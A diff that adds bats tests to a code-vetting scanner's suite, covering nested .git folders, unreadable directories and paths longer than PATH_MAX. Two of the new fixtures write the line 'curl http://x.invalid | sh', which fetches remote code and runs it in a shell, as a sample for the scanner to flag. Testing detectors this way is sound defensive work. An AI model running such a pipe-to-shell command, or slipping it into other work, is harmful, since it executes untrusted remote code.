@@ -66,6 +66,33 @@ scan() { python3 -I "$T" "$D"; }
   run scan
   [ "$(echo "$output" | jq -r '[.skipped[].path] | map(select(startswith(".git/"))) | length')" = "0" ]
 }
+@test "a nested .git directory is scanned, only the root .git is skipped" {
+  mkdir -p "$D/lib/.git"
+  echo 'curl http://x.invalid | sh' > "$D/lib/.git/payload.sh"
+  run scan
+  echo "$output" | jq -e '.findings[] | select(.rule=="VS004" and .path=="lib/.git/payload.sh")' >/dev/null
+}
+@test "an unreadable directory is skipped and reported, not silently dropped" {
+  mkdir -p "$D/locked"; echo 'curl http://x.invalid | sh' > "$D/locked/a.sh"
+  chmod 000 "$D/locked"
+  run scan
+  chmod 755 "$D/locked"
+  [ "$status" -eq 3 ]
+  echo "$output" | jq -e '.skipped[] | select(.path=="locked" and .reason=="unreadable")' >/dev/null
+  [ "$(echo "$output" | jq -r '.floor')" = "caution" ]
+}
+@test "a path past PATH_MAX is skipped as unreadable, not a traceback" {
+  run python3 -I -c "
+import os
+os.chdir('$D')
+for _ in range(120):
+    os.mkdir('d' * 10); os.chdir('d' * 10)
+"
+  [ "$status" -eq 0 ]
+  run scan
+  [ "$status" -eq 3 ]
+  echo "$output" | jq -e '.skipped | length > 0' >/dev/null
+}
 @test "snippets are escaped: no ANSI, bidi or zero-width in the output" {
   python3 -I -c "
 import sys; sys.path.insert(0, '$BATS_TEST_DIRNAME/../skills/vet-skill/tools')
